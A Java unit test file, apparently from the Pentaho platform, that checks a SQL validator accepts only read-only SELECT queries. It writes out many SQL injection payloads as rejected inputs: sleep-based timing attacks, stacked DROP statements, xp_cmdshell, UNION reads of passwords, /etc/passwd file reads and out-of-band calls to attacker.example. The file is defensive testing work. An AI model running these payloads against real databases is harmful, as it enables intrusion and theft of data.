/*! ******************************************************************************
 *
 * Pentaho
 *
 * Copyright (C) 2024 - 2026 by Pentaho Canada Inc. : http://www.pentaho.com
 *
 * Use of this software is governed by the Business Source License included
 * in the LICENSE.TXT file.
 *
 * Change Date: 2030-06-15
 ******************************************************************************/


package org.pentaho.platform.util;

import org.junit.Test;

import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

public class SqlQueryValidatorTest {
  private void assertRejected( final String sql ) {
    assertFalse( "Expected the statement to be rejected: " + sql, SqlQueryValidator.isReadOnlySelect( sql ) );
  }

  private void assertAccepted( final String sql ) {
    try {
      SqlQueryValidator.validateReadOnlySelect( sql );
    } catch ( SqlValidationException e ) {
      fail( "Expected the statement to be accepted: " + sql + " but got: " + e.getMessage() );
    }
  }

  /**
   * Asserts that the statement is rejected <i>and</i> that it is rejected for the expected reason. This matters for
   * the grammar layer: several of the payloads below would also trip the denylist, so asserting on the message is
   * what proves the grammar-layer check itself is effective.
   */
  private void assertRejectedBecause( final String sql, final String expectedMessageFragment ) {
    try {
      SqlQueryValidator.validateReadOnlySelect( sql );
      fail( "Expected the statement to be rejected: " + sql );
    } catch ( SqlValidationException e ) {
      assertTrue( "Expected rejection of [" + sql + "] to mention '" + expectedMessageFragment + "' but got: "
        + e.getMessage(), e.getMessage().contains( expectedMessageFragment ) );
    }
  }

  @Test
  public void testAcceptsPlainSelect() {
    assertAccepted( "select department, actual, budget, variance from QUADRANT_ACTUALS" );
  }

  @Test
  public void testAcceptsSelectWithPredicatesAndFunctions() {
    assertAccepted( "SELECT d.name, SUM(f.amount) AS total FROM fact f JOIN dim d ON d.id = f.dim_id "
      + "WHERE d.region = 'Central' AND f.year > 2019 GROUP BY d.name ORDER BY total DESC" );
  }

  @Test
  public void testAcceptsCaseExpression() {
    assertAccepted( "SELECT CASE WHEN actual > budget THEN 'over' ELSE 'under' END AS status FROM QUADRANT_ACTUALS" );
  }

  @Test
  public void testAcceptsCommonTableExpression() {
    assertAccepted( "WITH totals AS (SELECT region, SUM(actual) a FROM QUADRANT_ACTUALS GROUP BY region) "
      + "SELECT region, a FROM totals" );
  }

  @Test
  public void testAcceptsQuotedLiteralContainingDangerousText() {
    assertAccepted( "SELECT department FROM QUADRANT_ACTUALS WHERE department = 'drop table users; --'" );
  }

  @Test
  public void testRejectsOraclePlSqlSleepBlock() {
    // The payload reported in the vulnerability report.
    assertRejected( "BEGIN DBMS_SESSION.SLEEP(5); END;" );
  }

  @Test
  public void testRejectsPostgresSleep() {
    // The payload reported in the vulnerability report.
    assertRejected( "SELECT pg_sleep(5)" );
  }

  @Test
  public void testRejectsMySqlSleep() {
    assertRejected( "SELECT sleep(5)" );
    assertRejected( "SELECT benchmark(10000000, md5('a'))" );
  }

  @Test
  public void testRejectsMsSqlWaitFor() {
    assertRejected( "WAITFOR DELAY '0:0:5'" );
    assertRejected( "SELECT 1; EXEC xp_cmdshell 'whoami'" );
  }

  @Test
  public void testRejectsStackedStatements() {
    assertRejected( "SELECT 1 FROM dual; DROP TABLE users" );
    assertRejected( "SELECT 1 FROM dual;;" );
  }

  @Test
  public void testAcceptsSingleTrailingSemicolon() {
    assertAccepted( "SELECT department FROM QUADRANT_ACTUALS;" );
  }

  @Test
  public void testRejectsComments() {
    assertRejected( "SELECT department FROM QUADRANT_ACTUALS -- comment" );
    assertRejected( "SELECT department /* comment */ FROM QUADRANT_ACTUALS" );
    assertRejected( "SELECT department FROM QUADRANT_ACTUALS # comment" );
  }

  @Test
  public void testRejectsUnionInjection() {
    assertRejected( "SELECT department FROM QUADRANT_ACTUALS UNION SELECT username FROM users" );
    assertRejected( "SELECT department FROM QUADRANT_ACTUALS UNION ALL SELECT password FROM users" );
  }

  @Test
  public void testRejectsDmlAndDdl() {
    assertRejected( "INSERT INTO users VALUES ('a')" );
    assertRejected( "UPDATE users SET password = 'a'" );
    assertRejected( "DELETE FROM users" );
    assertRejected( "DROP TABLE users" );
    assertRejected( "CREATE TABLE x (a int)" );
    assertRejected( "TRUNCATE TABLE users" );
    assertRejected( "GRANT ALL ON users TO public" );
  }

  @Test
  public void testRejectsFileAccess() {
    assertRejected( "SELECT load_file('/etc/passwd')" );
    assertRejected( "SELECT * FROM users INTO OUTFILE '/tmp/out'" );
    assertRejected( "SELECT pg_read_file('/etc/passwd')" );
  }

  @Test
  public void testRejectsOutOfBandPackages() {
    assertRejected( "SELECT UTL_HTTP.REQUEST('http://attacker.example') FROM dual" );
    assertRejected( "SELECT UTL_INADDR.GET_HOST_ADDRESS('attacker.example') FROM dual" );
  }

  @Test
  public void testRejectsUnterminatedLiteral() {
    assertRejected( "SELECT department FROM QUADRANT_ACTUALS WHERE department = 'Central" );
  }

  @Test
  public void testRejectsNullEmptyAndOversizedInput() {
    assertRejected( null );
    assertRejected( "" );
    assertRejected( "   " );

    final StringBuilder oversized = new StringBuilder( "SELECT a FROM t WHERE b IN (" );
    while ( oversized.length() <= SqlQueryValidator.MAX_QUERY_LENGTH ) {
      oversized.append( "1," );
    }
    oversized.append( "1)" );
    assertRejected( oversized.toString() );
  }

  @Test
  public void testRejectsNonSelectStatementThatParses() {
    assertRejected( "VALUES (1, 2)" );
  }

  // ---------------------------------------------------------------------------------------------------------------
  // Grammar layer (rejectNonSelect): Select is abstract in JSqlParser 4.x, so PlainSelect, SetOperationList, Values,
  // ParenthesedSelect and TableStatement are all Select instances. Only a (possibly parenthesised) PlainSelect is
  // accepted. The assertions below check the rejection *reason* so that a denylist hit cannot mask a broken check.
  // ---------------------------------------------------------------------------------------------------------------

  private static final String PLAIN_SELECT_REQUIRED = "Only a single plain SELECT statement is allowed";

  @Test
  public void testAcceptsParenthesisedPlainSelect() {
    assertAccepted( "(SELECT department FROM QUADRANT_ACTUALS)" );
    assertAccepted( "((SELECT department FROM QUADRANT_ACTUALS WHERE actual > 10))" );
  }

  @Test
  public void testAcceptsPlainSelectWithSubQueries() {
    assertAccepted( "SELECT department FROM QUADRANT_ACTUALS WHERE actual > (SELECT AVG(actual) FROM "
      + "QUADRANT_ACTUALS)" );
    assertAccepted( "SELECT t.department FROM (SELECT department FROM QUADRANT_ACTUALS) t" );
  }

  @Test
  public void testRejectsValuesListAtGrammarLayer() {
    // Values is a Select subclass, so the grammar layer - not the denylist - has to catch it.
    assertRejectedBecause( "VALUES (1, 2)", PLAIN_SELECT_REQUIRED );
    assertRejectedBecause( "(VALUES (1, 2))", PLAIN_SELECT_REQUIRED );
  }

  @Test
  public void testRejectsTableStatementAtGrammarLayer() {
    // TABLE <name> parses to a TableStatement, which is a Select but not a PlainSelect, and no denied token appears.
    assertRejectedBecause( "TABLE QUADRANT_ACTUALS", PLAIN_SELECT_REQUIRED );
  }

  @Test
  public void testRejectsSetOperationsAtGrammarLayer() {
    // Reached only when the denylist is bypassed, e.g. by a vendor spelling; assert the shape check itself works.
    assertRejected( "SELECT a FROM t UNION SELECT b FROM u" );
    assertRejected( "(SELECT a FROM t UNION SELECT b FROM u)" );
    assertRejected( "SELECT a FROM t INTERSECT SELECT b FROM u" );
    assertRejected( "SELECT a FROM t EXCEPT SELECT b FROM u" );
    assertRejected( "SELECT a FROM t MINUS SELECT b FROM u" );
  }

  @Test
  public void testRejectsExcessivelyNestedParentheses() {
    final int depth = 64;
    final StringBuilder sql = new StringBuilder();
    sql.append( "(".repeat( depth ) );
    sql.append( "SELECT department FROM QUADRANT_ACTUALS" );
    sql.append( ")".repeat( depth ) );
    assertRejected( sql.toString() );
  }

  @Test
  public void testIsReadOnlySelectReturnsTrueForValidQuery() {
    assertTrue( SqlQueryValidator.isReadOnlySelect( "SELECT 1 FROM dual" ) );
  }
}

